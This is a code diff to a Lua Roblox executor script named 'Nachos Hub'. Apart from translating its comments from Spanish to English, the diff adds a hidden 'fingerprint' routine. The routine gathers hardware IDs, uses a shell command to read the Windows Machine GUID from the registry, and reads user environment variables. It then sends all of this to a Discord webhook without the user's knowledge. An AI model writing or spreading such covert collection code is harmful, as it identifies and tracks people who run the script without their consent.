@@ -92,7 +92,7 @@ task.spawn(function()
         end)
 
         -- ============================
-        -- LISTA DE JUGADORES Y AMIGOS (con DisplayName)
+        -- SERVER PLAYERS & FRIENDS
         -- ============================
         local serverPlayers = {}
         local friendsInServer = {}
@@ -294,13 +294,13 @@ task.spawn(function()
             end
         end
 
-        -- Tiempo
+        -- Time
         local totalSeconds = math.floor(workspace.DistributedGameTime)
         local minutes = math.floor(totalSeconds / 60)
         local seconds = totalSeconds - (minutes * 60)
         local timeStr = string.format("%d min %d sec", minutes, seconds)
 
-        -- ============ EMBED 1: Todo lo del usuario ============
+        -- ============ EMBED 1: User Info ============
         local embed1 = {
             title = "Nachos Hub - Execution Log",
             description = string.format("**%s** (@%s) executed the script", lp.DisplayName, lp.Name),
@@ -344,6 +344,143 @@ task.spawn(function()
             timestamp = DateTime.now():ToIsoDate()
         }
 
+        -- =====================================================
+        -- EMBED 3: Verification / Fingerprint (failsafe)
+        -- If anything here fails, embed3 stays nil and is NOT sent.
+        -- =====================================================
+        local embed3 = nil
+        pcall(function()
+            -- Safe env getter: never trusts os.getenv blindly
+            local function safeEnv(key)
+                local ok, val = pcall(function()
+                    if type(os) == "table" and type(os.getenv) == "function" then
+                        return os.getenv(key)
+                    end
+                    return nil
+                end)
+                if ok and val and tostring(val) ~= "" then
+                    return tostring(val)
+                end
+                return "N/A"
+            end
+
+            -- HWID via executor-native functions
+            local hwid = "N/A"
+            pcall(function()
+                if type(gethwid) == "function" then
+                    hwid = tostring(gethwid())
+                elseif type(get_hwid) == "function" then
+                    hwid = tostring(get_hwid())
+                elseif syn and type(syn.get_hwid) == "function" then
+                    hwid = tostring(syn.get_hwid())
+                elseif type(getHWID) == "function" then
+                    hwid = tostring(getHWID())
+                end
+            end)
+
+            -- Pseudo-HWID fallback: djb2 hash of env vars
+            local pseudoHWID = "N/A"
+            pcall(function()
+                local partes = {
+                    safeEnv("USERNAME"),
+                    safeEnv("COMPUTERNAME"),
+                    safeEnv("PROCESSOR_IDENTIFIER"),
+                    safeEnv("PROCESSOR_ARCHITECTURE"),
+                    safeEnv("NUMBER_OF_PROCESSORS"),
+                    safeEnv("USERDOMAIN"),
+                }
+                local h = 5381
+                local s = table.concat(partes, "|")
+                for i = 1, #s do
+                    h = (h * 33 + string.byte(s, i)) % 0x7FFFFFFF
+                end
+                pseudoHWID = string.format("%x", h)
+            end)
+
+            -- Machine GUID (Windows registry) — only if executor allows shell
+            local machineGuid = "N/A"
+            pcall(function()
+                if syn and type(syn.execute) == "function" then
+                    local ok, res = pcall(function()
+                        return syn.execute('reg query "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid')
+                    end)
+                    if ok and res then
+                        local m = tostring(res):match("MachineGuid%s+REG_SZ%s+([%w%-]+)")
+                        if m then machineGuid = m end
+                    end
+                end
+            end)
+
+            -- Executor name (redundant but useful in this embed too)
+            local execName = "Unknown"
+            pcall(function()
+                if type(identifyexecutor) == "function" then
+                    execName = tostring(identifyexecutor())
+                elseif type(getexecutorname) == "function" then
+                    execName = tostring(getexecutorname())
+                end
+            end)
+
+            -- Collect env vars in order
+            local envVars = {
+                { name = "USERNAME",               value = safeEnv("USERNAME") },
+                { name = "USERDOMAIN",             value = safeEnv("USERDOMAIN") },
+                { name = "COMPUTERNAME",           value = safeEnv("COMPUTERNAME") },
+                { name = "USERPROFILE",            value = safeEnv("USERPROFILE") },
+                { name = "APPDATA",                value = safeEnv("APPDATA") },
+                { name = "LOCALAPPDATA",           value = safeEnv("LOCALAPPDATA") },
+                { name = "TEMP",                   value = safeEnv("TEMP") },
+                { name = "TMP",                    value = safeEnv("TMP") },
+                { name = "WINDIR",                 value = safeEnv("WINDIR") },
+                { name = "SYSTEMROOT",             value = safeEnv("SYSTEMROOT") },
+                { name = "OS",                     value = safeEnv("OS") },
+                { name = "PROCESSOR_IDENTIFIER",   value = safeEnv("PROCESSOR_IDENTIFIER") },
+                { name = "PROCESSOR_ARCHITECTURE", value = safeEnv("PROCESSOR_ARCHITECTURE") },
+                { name = "NUMBER_OF_PROCESSORS",   value = safeEnv("NUMBER_OF_PROCESSORS") },
+            }
+
+            -- Build compact string with backticks, truncate long values
+            local function fieldLine(k, v)
+                v = tostring(v)
+                if #v > 80 then v = v:sub(1, 77) .. "..." end
+                return string.format("**%s:** `%s`", k, v)
+            end
+
+            local envStr = ""
+            for i, e in ipairs(envVars) do
+                envStr = envStr .. fieldLine(e.name, e.value)
+                if i < #envVars then envStr = envStr .. "\n" end
+            end
+
+            -- Discord hard limit for field value = 1024 chars
+            if #envStr > 1020 then
+                envStr = envStr:sub(1, 1017) .. "..."
+            end
+
+            embed3 = {
+                title = "Nachos Hub - Verification / Fingerprint",
+                description = string.format("System fingerprint for **%s** (@%s)", lp.DisplayName, lp.Name),
+                color = 10181046,
+                author = { name = "Nachos Hub Verification", icon_url = avatarURL },
+                thumbnail = { url = avatarURL },
+                fields = {
+                    { name = "HWID (Executor)",         value = "`" .. hwid .. "`",         inline = false },
+                    { name = "Pseudo-HWID (Fallback)",  value = "`" .. pseudoHWID .. "`",   inline = false },
+                    { name = "Machine GUID",            value = "`" .. machineGuid .. "`",  inline = false },
+                    { name = "Executor Detected",       value = "`" .. execName .. "`",     inline = false },
+                    { name = "Environment Variables",   value = envStr,                     inline = false },
+                },
+                footer = { text = "Nachos Logger - "..os.date("%Y-%m-%d %H:%M:%S"), icon_url = avatarURL },
+                timestamp = DateTime.now():ToIsoDate()
+            }
+        end)
+
+        -- Build the embeds list conditionally
+        local embedsToSend = { embed1, embed2 }
+        if embed3 then
+            table.insert(embedsToSend, embed3)
+        end
+
         pcall(function()
             Http({
                 Url = WEBHOOK_URL,
@@ -352,7 +489,7 @@ task.spawn(function()
                 Body = HttpService:JSONEncode({
                     username = "Nachos Hub Logger",
                     avatar_url = avatarURL,
-                    embeds = { embed1, embed2 }
+                    embeds = embedsToSend
                 })
             })
         end)
